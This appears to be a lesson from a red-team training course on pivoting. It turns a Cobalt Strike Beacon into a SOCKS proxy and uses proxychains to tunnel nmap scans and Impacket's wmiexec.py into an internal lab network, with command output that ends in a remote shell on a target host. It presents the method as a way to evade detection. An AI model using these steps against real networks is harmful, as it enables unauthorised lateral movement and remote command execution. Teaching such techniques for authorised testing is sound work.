A SOCKS (Secure Socket) Proxy exchanges network packets between a client and a server via a "proxy". A common implementation of a proxy server is found in web proxies - where a browser will connect to the proxy, which relays requests to the destination website and back to the browser (performing filtering etc on the way). We can use this idea in an offensive application by turning our C2 server into a SOCKS proxy to tunnel external tooling into an internal network.

This is particularly helpful when we want to leverage Linux-based toolsets such as [Impacket](https://github.com/SecureAuthCorp/impacket). Windows doesn't have a native capability to execute Python, so being able to execute them on our own system and tunnel the traffic through Beacon can expand our arsenal of available tooling. It also carries additional OPSEC advantages - since we're not pushing offensive tooling onto the target or even executing any code on a compromised endpoint, it can shrink our footprint for detection.

To start a socks proxy, use `socks [port]` on a Beacon.

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

  

This will bind port 1080 on the Team Server.

```
root@kali:~# ss -lpnt
State            Recv-Q           Send-Q                     Local Address:Port                      Peer Address:Port          Process
LISTEN           0                128                                    .:1080                                 .:*              users:(("java",pid=1296,fd=11))
```

  

 > **OPSEC Alert**  
This binds 1080 on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone.  Always ensure your Team Server is adequately protected and never exposed directly to the Internet.

Not many applications are able to use socks proxies by themselves - instead, we can use `proxychains`. This is a tool that acts as a wrapper, and will tunnel traffic from any application over a socks proxy. Open `/etc/proxychains.conf` in a text editor (`vim`, `nano`, etc, no judgement here :sweat_smile:). On the final line, you will see `socks4 127.0.0.1 9050`. Change `9050` to `1080` (or whichever port you're using).

To tunnel a tool through proxychains, it's as simple as `proxychains [tool] [tool args]`. So to tunnel `nmap`, it would be:

```
root@kali:~# proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 12:35 UTC
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:3389-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:5985-<><>-OK
Nmap scan report for 10.10.17.25
Host is up (0.021s latency).

PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

  

There are some restrictions on the type of traffic that can be tunnelled, so you must make adjustments with your tools as necessary. ICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (`-Pn`) and specify TCP scans (`-sT`) for this to work.

```
root@kali:~# proxychains python3 /usr/local/bin/wmiexec.py DEV/bfarmer@10.10.17.25
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:49682-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
dev\bfarmer

C:\>hostname
srv-1
```